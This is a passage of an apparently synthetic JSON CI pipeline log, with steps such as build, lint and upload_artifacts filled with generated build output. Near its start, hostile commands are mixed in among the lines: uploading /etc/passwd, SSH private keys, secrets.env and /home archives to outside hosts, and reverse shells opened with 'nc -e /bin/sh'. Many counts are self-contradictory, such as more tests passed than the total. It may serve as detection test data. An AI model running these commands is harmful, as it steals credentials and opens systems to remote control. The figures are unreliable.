760MB\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nFinished.\nSuccess!\nOK\n[12:19:19] DEBUG: Query executed in 10ms\nAlready up to date.\nOptimizing 81 modules...\nnpm notice: created a lockfile\n[12:19:19] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:19] INFO: Starting build process\nCreating production build...\nFinished.\n[12:19:19] DEBUG: Loading configuration\nCoverage: 84% statements, 61% branches\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nImage pulled successfully\nImage pulled successfully\necho $(cat ~/.ssh/id_rsa) | base64 | nc 222.68.95.221 18854\nSwitched to branch 'hotfix/task-816'\necho $(cat ~/.ssh/id_rsa) | base64 | nc 88.195.107.16 10610\nMinifying main.js\n[12:19:19] DEBUG: Initializing service\nEnvironment: production\nCache hit for key-1705\nnpm notice: package.json updated\n\u2713 Task completed in 895ms\nStep 10/17: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:19] INFO: Connecting to database\nHEAD is now at 2c6608e\n\u2713 All checks passed\nCreating production build...\nGenerating source maps...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 232.107.41.148 50187\nHEAD is now at 79b2372\n[12:19:19] DEBUG: Loading configuration\nStep 3/22: Testing\nOptimizing 73 modules...\nTime: 75.534s\npip install: Successfully installed webpack-2.8\nStep 13/17: Building\nCache invalidated: node_modules\nnc -e /bin/sh 71.88.12.131 17542\nAlready up to date.\nFAILED: test_auth_login\nLayer 3/10: COPY command\nProcessing...\nMinifying main.js\n\u2713 All checks passed\nWARNING: axios has known vulnerabilities\nnc -e /bin/sh 244.162.148.233 29759\nSending 79MB of data to test.io\nDone.\n[12:19:19] DEBUG: Initializing service\nCompiling src/app.ts...\nCompleted.\n[12:19:19] DEBUG: Connection pool: 15 active\nStep 14/21: Deploying\nSwitched to branch 'feature/task-920'\nSending 462MB of data to example.com\nPulling image: node:latest\ncurl -X POST https://test.io/collect -d @secrets.env\nWARNING: react has known vulnerabilities\nSending 270MB of data to example.com\nOptimizing 98 modules...\nCoverage: 79% statements, 93% branches\nMinifying main.js\nnc -e /bin/sh 180.215.238.133 18784\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nStep 18/25: Running migrations\nPulling image: node:latest\n[12:19:19] INFO: Request completed\nCoverage: 98% statements, 86% branches\nCompiling components/service.java...\n\u2713 Task completed in 3096ms\nException: ValueError\nCache invalidated: build\npip: Downloading react-5.9.tar.gz\n\u2713 Task completed in 4834ms\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nPushing to registry...\n[12:19:19] DEBUG: Memory usage: 1409MB\nFetching submodules...\nLoading...\nnpm notice: package.json updated\nImage pulled successfully\nTest Suites: 11 passed, 18 total\nProcessing...\n[12:19:19] DEBUG: Connection pool: 16 active\nnpm install: added 200 packages\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nChecking out master branch\nVerifying...\n[12:19:19] WARN: Deprecated API usage\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\npip: Installing build dependencies...\nStep 2/16: Running migrations\n[12:19:19] DEBUG: Connection pool: 1 active\n=== Step save_cache completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-22T12:19:19.085802",
        "finished_at": "2025-11-22T12:19:26.281699",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Fetching submodules...",
          "Step 6/25: Installing dependencies",
          "Coverage: 77% statements, 77% branches",
          "npm install: resolved 1674 packages",
          "Switched to branch 'bugfix/task-480'",
          "POST /upload - 200 (372ms)",
          "Completed.",
          "Waiting...",
          "Artifact downloaded: 34MB",
          "Checking out develop branch",
          "Connecting to startup.dev:443...",
          "npm notice: package.json updated",
          "OK",
          "Compiling components/index.js...",
          "Snapshots: 42 passed, 38 total",
          "Tests: 287 passed, 463 total",
          "Connection established",
          "[12:19:19] INFO: Connecting to database",
          "Installing axios@2.8.6",
          "Test Suites: 30 passed, 10 total",
          "[12:19:19] DEBUG: Initializing service",
          "Cache restored successfully (300MB)",
          "Compiling utils/handler.rs...",
          "Verifying...",
          "pip: Collecting jest",
          "WARNING: webpack has known vulnerabilities",
          "\u2717 build failed with exit code 99",
          "Compiling utils/service.java...",
          "Installing lodash@3.7.5",
          "Already up to date.",
          "Completed.",
          "NODE_ENV=development",
          "\u2713 lint completed",
          "[12:19:19] INFO: Connecting to database",
          "[12:19:19] INFO: Starting build process",
          "Using Node.js 17.15.5",
          "Ready.",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:19] DEBUG: Query executed in 67ms",
          "[12:19:19] DEBUG: Query executed in 56ms",
          "Optimizing 36 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 6/15: COPY command",
          "Platform: linux-x64",
          "Fetching submodules...",
          "Switched to branch 'hotfix/task-502'",
          "Minifying app.js",
          "GET /status - 200 (43ms)",
          "Switched to branch 'feature/task-940'",
          "Generating source maps...",
          "[12:19:19] DEBUG: Connection pool: 19 active",
          "[12:19:19] WARN: Deprecated API usage",
          "Coverage: 70% statements, 73% branches",
          "WARNING: lodash has known vulnerabilities",
          "Connection established",
          "[12:19:19] WARN: Deprecated API usage",
          "Fetching submodules...",
          "pip: Collecting express",
          "Creating production build...",
          "FAILED: test_db_connect",
          "Checking out develop branch",
          "Step 1/22: Deploying",
          "Ran 73 tests in 40s",
          "Step 6/19: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 16 passed, 14 total",
          "[12:19:19] INFO: Starting build process",
          "Connecting to startup.dev:443...",
          "Building Docker image...",
          "[12:19:19] DEBUG: Initializing service",
          "HEAD is now at 5cca49a",
          "pip: Collecting webpack",
          "pip install: Successfully installed react-5.16",
          "[12:19:19] INFO: Processing request",
          "Step 5/16: Installing dependencies",
          "Step 15/25: Deploying",
          "Waiting...",
          "Step 8/16: Deploying",
          "[12:19:19] INFO: Request completed",
          "Platform: darwin-arm64",
          "[12:19:19] DEBUG: Initializing service",
          "WARNING: eslint has known vulnerabilities",
          "Transforming 933 files...",
          "Step 19/22: Building",
          "POST /upload - 200 (221ms)",
          "NODE_ENV=test",
          "[12:19:19] DEBUG: Loading configuration",
          "Generating source maps...",
          "Installing webpack@3.8.1",
          "[12:19:19] WARN: Deprecated API usage",
          "Artifact downloaded: 32MB",
          "HEAD is now at 4e0c5fd",
          "[12:19:19] DEBUG: Query executed in 79ms",
          "Cache saved successfully",
          "Compiling lib/utils.go...",
          "NODE_ENV=development",
          "[12:19:19] INFO: Cache refreshed",
          "Checking out main branch",
          "Cache restored successfully (470MB)",
          "[12:19:19] INFO: Cache refreshed",
          "Time: 109.292s",
          "Time: 118.580s",
          "[12:19:19] WARN: Deprecated API usage",
          "npm install: added 114 packages",
          "Using Node.js 16.1.9",
          "Step 2/15: Linting",
          "FAILED: test_api_health",
          "yarn add: Done in 20.82s",
          "\u2713 All checks passed",
          "Tests: 359 passed, 500 total",
          "Compiling components/service.java...",
          "Cache hit for key-3996",
          "[12:19:19] INFO: Starting build process",
          "Connecting to startup.dev:443...",
          "Step 11/22: Deploying",
          "WARNING: axios has known vulnerabilities",
          "pip: Collecting webpack",
          "Artifact uploaded: build.tar.gz (17MB)",
          "pip: Downloading eslint-3.11.tar.gz",
          "[12:19:19] INFO: Request completed",
          "Processing...",
          "pip: Downloading webpack-1.14.tar.gz",
          "Bundling vendor.js",
          "Step 16/19: Linting",
          "Snapshots: 4 passed, 21 total",
          "Environment: staging",
          "Step 18/17: Linting",
          "Connection established",
          "Creating production build...",
          "HEAD is now at e0b0f0c",
          "[12:19:19] INFO: Processing request",
          "Step 15/16: Linting",
          "Transforming 666 files...",
          "Time: 90.342s",
          "Using Node.js 17.14.2",
          "Cache miss for key-7664",
          "Connecting to cloud.services:443...",
          "Artifact downloaded: 24MB",
          "Step 16/23: Building",
          "Ran 164 tests in 49s",
          "Cache hit for key-8644",
          "Step 15/22: Installing dependencies",
          "Cache miss for key-6026",
          "Compiling lib/utils.go...",
          "[12:19:19] WARN: Deprecated API usage",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-22T12:19:26.281699",
        "finished_at": "2025-11-22T12:19:47.869390",
        "log_lines": [
          "=== Step: build ===",
          "POST /data - 200 (250ms)",
          "Generating source maps...",
          "Step 17/23: Building",
          "[12:19:19] INFO: Starting build process",
          "Compiling src/utils.go...",
          "[12:19:19] INFO: Starting build process",
          "Installing jest@4.2.9",
          "[12:19:19] DEBUG: Query executed in 94ms",
          "npm install: resolved 916 packages",
          "Success!",
          "Using Node.js 17.16.1",
          "WARNING: express has known vulnerabilities",
          "npm install: resolved 1603 packages",
          "Minifying vendor.js",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:19:19] INFO: Request completed",
          "Connecting to example.com:443...",
          "Using Node.js 17.9.10",
          "Ready.",
          "Cache hit for key-2830",
          "Waiting...",
          "Compiling components/utils.go...",
          "[12:19:19] INFO: Processing request",
          "pip: Collecting prettier",
          "[12:19:19] INFO: Request completed",
          "WARNING: axios has known vulnerabilities",
          "Checking out master branch",
          "Cache hit for key-8618",
          "NODE_ENV=test",
          "npm notice: created a lockfile",
          "[12:19:19] WARN: Deprecated API usage",
          "Optimizing 45 modules...",
          "Switched to branch 'feature/task-332'",
          "Platform: darwin-arm64",
          "Optimizing 14 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Time: 56.333s",
          "Layer 8/8: RUN command",
          "Compiling src/service.java...",
          "Compiling utils/utils.go...",
          "NODE_ENV=test",
          "Ready.",
          "[12:19:19] INFO: Processing request",
          "OK",
          "Cache saved successfully",
          "Snapshots: 37 passed, 8 total",
          "Pulling image: node:latest",
          "WARNING: eslint has known vulnerabilities",
          "Snapshots: 47 passed, 31 total",
          "Ran 189 tests in 8s",
          "Switched to branch 'hotfix/task-662'",
          "[12:19:19] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Completed.",
          "npm install: resolved 1227 packages",
          "Artifact uploaded: dist.zip (95MB)",
          "Step 5/23: Linting",
          "Already up to date.",
          "pip install: Successfully installed react-4.12",
          "Artifact downloaded: 44MB",
          "Snapshots: 49 passed, 38 total",
          "Cache invalidated: dependencies",
          "Step 20/25: Testing",
          "Environment: production",
          "Checking out main branch",
          "  PASS: test_cache_hit (191ms)",
          "Building Docker image...",
          "\u2713 Task completed in 3652ms",
          "Using Python 3.9",
          "Compiling src/main.py...",
          "Using Python 3.10",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:19:19] DEBUG: Initializing service",
          "pip: Collecting jest",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] DEBUG: Memory usage: 1563MB",
          "Artifact downloaded: 44MB",
          "Already up to date.",
          "[12:19:19] ERROR: Connection failed",
          "Optimizing 36 modules...",
          "[12:19:19] INFO: Cache refreshed",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] INFO: Starting build process",
          "[12:19:19] WARN: Deprecated API usage",
          "Step 13/15: Installing dependencies",
          "GET /status - 200 (54ms)",
          "Cache hit for key-5879",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:19] INFO: Connecting to database",
          "Optimizing 86 modules...",
          "[12:19:19] INFO: Cache refreshed",
          "Finished.",
          "Cache miss for key-5982",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Test Suites: 21 passed, 11 total",
          "Verifying...",
          "Step 20/25: Building",
          "Tests: 258 passed, 264 total",
          "[12:19:19] DEBUG: Query executed in 3ms",
          "Image pulled successfully",
          "Using Node.js 20.15.0",
          "OK",
          "pip: Installing build dependencies...",
          "[12:19:19] ERROR: Connection failed",
          "HEAD is now at 8dc3937",
          "Step 6/21: Installing dependencies",
          "WARNING: prettier has known vulnerabilities",
          "OK",
          "Artifact uploaded: dist.zip (41MB)",
          "Environment: staging",
          "Loading...",
          "Processing...",
          "Compiling components/service.java...",
          "Compiling src/utils.go...",
          "Success!",
          "Layer 10/8: ENV command",
          "Transforming 406 files...",
          "Checking out master branch",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:19] INFO: Processing request",
          "Transforming 183 files...",
          "Waiting...",
          "Generating source maps...",
          "pip: Downloading lodash-1.20.tar.gz",
          "Step 12/18: Running migrations",
          "Platform: win32-x64",
          "Time: 28.482s",
          "Processing...",
          "Checking out develop branch",
          "[12:19:19] INFO: Request completed",
          "Step 11/24: Building",
          "[12:19:19] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "Uploading artifact 'build' (44 files)",
          "Step 20/24: Linting",
          "Uploading artifact 'build' (15 files)",
          "Optimizing 70 modules...",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_db_connect",
          "pip: Installing build dependencies...",
          "[12:19:19] DEBUG: Memory usage: 804MB",
          "Minifying app.js",
          "Cache invalidated: build",
          "\u2713 Step 'test' succeeded",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-22T12:19:47.869390",
        "finished_at": "2025-11-22T12:19:55.065287",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "GET /health - 201 (43ms)",
          "Creating production build...",
          "Transforming 156 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "yarn add: Done in 8.85s",
          "Compiling lib/service.java...",
          "Pulling image: alpine:18",
          "Uploading artifact 'build' (35 files)",
          "NODE_ENV=production",
          "npm install: resolved 493 packages",
          "Step 4/15: Linting",
          "GET /api - 204 (93ms)",
          "Ready.",
          "npm install: resolved 1507 packages",
          "Processing...",
          "npm install: added 131 packages",
          "Optimizing 95 modules...",
          "Step 18/24: Deploying",
          "Processing...",
          "yarn add: Done in 9.71s",
          "[12:19:19] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (52MB)",
          "[12:19:19] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Finished.",
          "[12:19:19] WARN: Deprecated API usage",
          "Building Docker image...",
          "Processing...",
          "Optimizing 44 modules...",
          "GET /health - 201 (43ms)",
          "  PASS: test_api_health (69ms)",
          "\u2717 build failed with exit code 35",
          "  PASS: integration/test_api_health.spec.js",
          "Cache restored successfully (201MB)",
          "Done.",
          "Time: 114.345s",
          "[12:19:19] INFO: Starting build process",
          "[12:19:19] DEBUG: Loading configuration",
          "Switched to branch 'hotfix/task-208'",
          "[12:19:19] DEBUG: Initializing service",
          "Ready.",
          "Building Docker image...",
          "Step 6/23: Deploying",
          "Ran 152 tests in 8s",
          "Snapshots: 13 passed, 18 total",
          "HEAD is now at 2ee8e6d",
          "npm install: added 234 packages",
          "Using Python 3.10",
          "GET /status - 201 (25ms)",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:19:19] INFO: Request completed",
          "Cache restored successfully (479MB)",
          "Environment: development",
          "WARNING: axios has known vulnerabilities",
          "POST /api - 200 (96ms)",
          "Cache hit for key-1524",
          "Ready.",
          "Artifact uploaded: dist.zip (27MB)",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: package.json updated",
          "Connection established",
          "Uploading artifact 'coverage' (20 files)",
          "pip: Collecting axios",
          "Pushing to registry...",
          "Tests: 96 passed, 380 total",
          "Completed.",
          "npm install: resolved 280 packages",
          "HEAD is now at 7d8eed6",
          "Connection established",
          "Artifact uploaded: dist.zip (84MB)",
          "Exception: ValueError",
          "npm notice: created a lockfile",
          "pip install: Successfully installed lodash-4.18",
          "pip install: Successfully installed lodash-2.1",
          "  PASS: test_db_connect (178ms)",
          "Switched to branch 'hotfix/task-314'",
          "Cache restored successfully (14MB)",
          "[12:19:19] INFO: Starting build process",
          "pip: Downloading react-5.3.tar.gz",
          "  PASS: e2e/test_db_connect.spec.js",
          "Exception: RuntimeError",
          "Step 5/21: Installing dependencies",
          "\u2713 lint completed",
          "[12:19:19] INFO: Cache refreshed",
          "npm install: resolved 1244 packages",
          "Verifying...",
          "\u2713 Step 'checkout' succeeded",
          "Artifact downloaded: 32MB",
          "Artifact downloaded: 10MB",
          "Exception: RuntimeError",
          "Generating source maps...",
          "pip: Collecting jest",
          "Cache saved successfully",
          "Generating source maps...",
          "Success!",
          "[12:19:19] WARN: Deprecated API usage",
          "Processing...",
          "Finished.",
          "[12:19:19] INFO: Cache refreshed",
          "Waiting...",
          "Cache hit for key-2203",
          "Completed.",
          "POST /data - 200 (260ms)",
          "Platform: linux-x64",
          "Cache hit for key-4652",
          "[12:19:19] INFO: Cache refreshed",
          "Step 4/17: Installing dependencies",
          "pip: Collecting eslint",
          "npm install: added 360 packages",
          "Step 16/16: Installing dependencies",
          "[12:19:19] INFO: Request completed",
          "yarn add: Done in 25.92s",
          "WARNING: react has known vulnerabilities",
          "Pulling image: python:18",
          "Step 10/22: Running migrations",
          "npm notice: created a lockfile",
          "Cache hit for key-7797",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "\u2713 Task completed in 2929ms",
          "NODE_ENV=development",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:19] DEBUG: Loading configuration",
          "Ready.",
          "[12:19:19] WARN: Deprecated API usage",
          "Step 7/23: Running migrations",
          "npm install: added 397 packages",
          "[12:19:19] INFO: Connecting to database",
          "Tests: 124 passed, 270 total",
          "  PASS: integration/test_user_create.spec.js",
          "npm install: resolved 1497 packages",
          "Compiling components/handler.rs...",
          "npm notice: created a lockfile",
          "WARNING: prettier has known vulnerabilities",
          "Step 5/16: Running migrations",
          "Completed.",
          "[12:19:19] INFO: Request completed",
          "Test Suites: 20 passed, 25 total",
          "Environment: development",
          "Compiling lib/utils.go...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 deploy completed",
          "Connecting to acme.corp:443...",
          "Verifying...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-22T12:19:55.065287",
        "finished_at": "2025-11-22T12:20:02.261184",
        "log_lines": [
          "=== Step: setup_environment ===",
          "\u2713 Task completed in 2750ms",
          "\u2713 All checks passed",
          "Test Suites: 50 passed, 30 total",
          "Pushing to registry...",
          "npm install: resolved 500 packages",
          "Layer 10/12: RUN command",
          "npm install: added 24 packages",
          "Connecting to acme.corp:443...",
          "Verifying...",
          "Loading...",
          "[12:19:19] WARN: Deprecated API usage",
          "GET /health - 200 (56ms)",
          "Fetching submodules...",
          "Step 19/20: Deploying",
          "Building Docker image...",
          "npm install: added 272 packages",
          "Waiting...",
          "Creating production build...",
          "Checking out main branch",
          "Processing...",
          "  PASS: integration/test_api_health.spec.js",
          "[12:19:19] DEBUG: Initializing service",
          "Cache restored successfully (395MB)",
          "\u2713 Task completed in 4470ms",
          "[12:19:19] DEBUG: Loading configuration",
          "Step 5/24: Running migrations",
          "Building Docker image...",
          "Step 2/25: Linting",
          "Building Docker image...",
          "Checking out master branch",
          "Pushing to registry...",
          "Connecting to example.com:443...",
          "Compiling utils/utils.go...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "OK",
          "Success!",
          "Creating production build...",
          "Done.",
          "Ran 17 tests in 56s",
          "[12:19:19] INFO: Request completed",
          "Pulling image: python:3.11",
          "[12:19:19] DEBUG: Connection pool: 20 active",
          "Step 20/23: Installing dependencies",
          "Cache invalidated: build",
          "Success!",
          "Success!",
          "Image pulled successfully",
          "Step 4/19: Linting",
          "npm notice: package.json updated",
          "Finished.",
          "Transforming 325 files...",
          "[12:19:19] DEBUG: Loading configuration",
          "[12:19:19] INFO: Starting build process",
          "[12:19:19] DEBUG: Connection pool: 6 active",
          "Using Node.js 14.19.10",
          "Compiling src/handler.rs...",
          "Tests: 124 passed, 78 total",
          "Connecting to cloud.services:443...",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Pulling image: node:3.11",
          "FAILED: test_user_create",
          "Verifying...",
          "npm install: added 250 packages",
          "\u2713 All checks passed",
          "Using Python 3.11",
          "\u2713 Step 'setup' succeeded",
          "  PASS: integration/test_cache_hit.spec.js",
          "Success!",
          "Cache hit for key-9232",
          "Transforming 891 files...",
          "\u2713 Task completed in 3773ms",
          "\u2713 Task completed in 1100ms",
          "Time: 86.507s",
          "[12:19:19] WARN: Deprecated API usage",
          "Compiling components/main.py...",
          "Success!",
          "OK",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] INFO: Cache refreshed",
          "Pulling image: node:3.11",
          "[12:19:19] DEBUG: Memory usage: 755MB",
          "Ran 74 tests in 58s",
          "\u2713 Task completed in 2028ms",
          "Finished.",
          "Snapshots: 35 passed, 31 total",
          "[12:19:19] INFO: Cache refreshed",
          "HEAD is now at 4bb7ad1",
          "Minifying app.js",
          "GET /api - 200 (24ms)",
          "\u2713 Task completed in 4531ms",
          "Cache restored successfully (409MB)",
          "Building Docker image...",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] DEBUG: Query executed in 11ms",
          "Switched to branch 'bugfix/task-256'",
          "Ran 84 tests in 16s",
          "Environment: production",
          "Loading...",
          "Verifying...",
          "Step 2/23: Deploying",
          "[12:19:19] INFO: Starting build process",
          "FAILED: test_user_create",
          "Creating production build...",
          "Using Python 3.12",
          "NODE_ENV=development",
          "Pushing to registry...",
          "Cache hit for key-6870",
          "npm install: added 23 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:19] DEBUG: Query executed in 54ms",
          "Cache saved successfully",
          "[12:19:19] DEBUG: Initializing service",
          "Building Docker image...",
          "Already up to date.",
          "[12:19:19] INFO: Request completed",
          "Coverage: 93% statements, 60% branches",
          "Checking out develop branch",
          "Creating production build...",
          "Installing lodash@5.14.0",
          "Step 19/16: Running migrations",
          "Time: 22.889s",
          "Platform: darwin-arm64",
          "Verifying...",
          "Cache restored successfully (485MB)",
          "npm install: added 202 packages",
          "yarn add: Done in 19.2s",
          "Image pulled successfully",
          "Finished.",
          "  PASS: e2e/test_user_create.spec.js",
          "Creating production build...",
          "Fetching submodules...",
          "[12:19:19] INFO: Cache refreshed",
          "Platform: linux-x64",
          "Loading...",
          "Artifact downloaded: 16MB",
          "GET /status - 204 (45ms)",
          "Cache invalidated: dependencies",
          "\u2713 validate completed",
          "Ready.",
          "yarn add: Done in 4.11s",
          "Processing...",
          "pip: Collecting jest",
          "pip install: Successfully installed express-2.7",
          "  PASS: unit/test_api_health.spec.js",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-22T12:20:02.261184",
        "finished_at": "2025-11-22T12:20:09.457081",
        "log_lines": [
          "=== Step: setup_node ===",
          "Cache invalidated: node_modules",
          "Step 9/23: Linting",
          "Cache hit for key-5977",
          "[12:19:19] DEBUG: Memory usage: 924MB",
          "npm install: added 104 packages",
          "Installing eslint@1.11.6",
          "Step 12/25: Running migrations",
          "Snapshots: 19 passed, 47 total",
          "[12:19:19] INFO: Processing request",
          "[12:19:19] INFO: Starting build process",
          "[12:19:19] DEBUG: Memory usage: 1681MB",
          "Loading...",
          "[12:19:19] INFO: Cache refreshed",
          "Switched to branch 'feature/task-702'",
          "npm install: added 298 packages",
          "Cache miss for key-2902",
          "Generating source maps...",
          "npm install: added 342 packages",
          "Completed.",
          "Completed.",
          "Generating source maps...",
          "npm install: resolved 1625 packages",
          "WARNING: express has known vulnerabilities",
          "Cache restored successfully (496MB)",
          "Cache miss for key-7746",
          "Bundling main.css",
          "Artifact uploaded: dist.zip (62MB)",
          "Minifying main.js",
          "Creating production build...",
          "Creating production build...",
          "pip: Downloading prettier-3.20.tar.gz",
          "Already up to date.",
          "Step 11/15: Building",
          "Creating production build...",
          "Step 1/24: Linting",
          "Compiling src/main.py...",
          "Checking out develop branch",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 113",
          "Uploading artifact 'build' (18 files)",
          "Snapshots: 13 passed, 34 total",
          "OK",
          "GET /status - 201 (73ms)",
          "[12:19:19] DEBUG: Connection pool: 9 active",
          "Cache saved successfully",
          "WARNING: webpack has known vulnerabilities",
          "[12:19:19] INFO: Connecting to database",
          "[12:19:19] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Done.",
          "Cache miss for key-7933",
          "Artifact uploaded: dist.zip (67MB)",
          "Cache miss for key-5969",
          "Environment: development",
          "[12:19:19] DEBUG: Loading configuration",
          "Generating source maps...",
          "GET /health - 201 (74ms)",
          "Creating production build...",
          "Finished.",
          "Cache miss for key-5536",
          "Image pulled successfully",
          "Compiling components/handler.rs...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:19:19] DEBUG: Query executed in 68ms",
          "[12:19:19] INFO: Connecting to database",
          "Layer 4/15: ENV command",
          "WARNING: axios has known vulnerabilities",
          "Minifying vendor.js",
          "Environment: staging",
          "[12:19:19] DEBUG: Query executed in 12ms",
          "[12:19:19] WARN: Deprecated API usage",
          "\u2713 build completed",
          "\u2713 All checks passed",
          "Verifying...",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:19] INFO: Starting build process",
          "Cache hit for key-4576",
          "Cache hit for key-8467",
          "Waiting...",
          "npm notice: created a lockfile",
          "Compiling src/utils.go...",
          "Step 10/18: Running migrations",
          "[12:19:19] WARN: Deprecated API usage",
          "Generating source maps...",
          "OK",
          "[12:19:19] INFO: Request completed",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Loading...",
          "Coverage: 89% statements, 89% branches",
          "[12:19:19] DEBUG: Memory usage: 639MB",
          "yarn add: Done in 6.7s",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] WARN: Deprecated API usage",
          "Generating source maps...",
          "Cache hit for key-5733",
          "TLS handshake completed",
          "FAILED: test_db_connect",
          "Pushing to registry...",
          "FAILED: test_cache_hit",
          "Pulling image: alpine:3.11",
          "Cache invalidated: dependencies",
          "FAILED: test_auth_login",
          "GET /health - 204 (99ms)",
          "Checking out master branch",
          "[12:19:19] INFO: Starting build process",
          "Pushing to registry...",
          "pip install: Successfully installed prettier-2.2",
          "pip install: Successfully installed jest-4.6",
          "pip: Downloading lodash-3.19.tar.gz",
          "FAILED: test_auth_login",
          "[12:19:19] INFO: Cache refreshed",
          "pip: Downloading jest-3.18.tar.gz",
          "pip: Installing build dependencies...",
          "POST /upload - 200 (370ms)",
          "Step 14/21: Linting",
          "Checking out develop branch",
          "\u2713 Step 'install' succeeded",
          "[12:19:19] INFO: Cache refreshed",
          "Environment: test",
          "npm install: resolved 471 packages",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-5694",
          "pip install: Successfully installed express-3.11",
          "[12:19:19] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Snapshots: 14 passed, 45 total",
          "npm notice: created a lockfile",
          "yarn add: Done in 17.27s",
          "TLS handshake completed",
          "Processing...",
          "Image pulled successfully",
          "Using Node.js 19.17.7",
          "[12:19:19] DEBUG: Query executed in 99ms",
          "npm notice: created a lockfile",
          "Time: 115.200s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "Checking out master branch",
          "Cache miss for key-5802",
          "WARNING: eslint has known vulnerabilities",
          "Finished.",
          "\u2713 All checks passed",
          "Tests: 76 passed, 150 total",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-22T12:20:09.457081",
        "finished_at": "2025-11-22T12:20:16.652978",
        "log_lines": [
          "=== Step: lint ===",
          "Loading...",
          "Loading...",
          "Pushing to registry...",
          "npm install: added 321 packages",
          "  PASS: test_db_connect (17ms)",
          "Success!",
          "Compiling src/handler.rs...",
          "[12:19:19] WARN: Deprecated API usage",
          "Layer 3/8: COPY command",
          "\u2713 All checks passed",
          "[12:19:19] INFO: Processing request",
          "[12:19:19] INFO: Cache refreshed",
          "Installing react@5.14.1",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 26.904s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "[12:19:19] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "[12:19:19] INFO: Starting build process",
          "npm install: added 416 packages",
          "Building Docker image...",
          "Generating source maps...",
          "Compiling src/handler.rs...",
          "[12:19:19] DEBUG: Memory usage: 1750MB",
          "Using Node.js 19.2.7",
          "POST /data - 202 (176ms)",
          "npm notice: created a lockfile",
          "Completed.",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: build",
          "OK",
          "GET /api - 201 (35ms)",
          "[12:19:19] DEBUG: Connection pool: 5 active",
          "WARNING: lodash has known vulnerabilities",
          "Already up to date.",
          "Fetching submodules...",
          "Step 12/24: Running migrations",
          "FAILED: test_cache_hit",
          "Cache hit for key-4483",
          "HEAD is now at 6837660",
          "pip: Installing build dependencies...",
          "WARNING: eslint has known vulnerabilities",
          "Pushing to registry...",
          "Pulling image: node:3.11",
          "Compiling src/service.java...",
          "Cache restored successfully (196MB)",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] INFO: Starting build process",
          "Loading...",
          "Ran 52 tests in 43s",
          "pip install: Successfully installed prettier-4.4",
          "pip: Collecting webpack",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 5/21: Deploying",
          "Cache restored successfully (340MB)",
          "\u2717 build failed with exit code 42",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Collecting axios",
          "npm install: added 433 packages",
          "OK",
          "[12:19:19] INFO: Processing request",
          "Connecting to example.com:443...",
          "Tests: 448 passed, 230 total",
          "OK",
          "Platform: win32-x64",
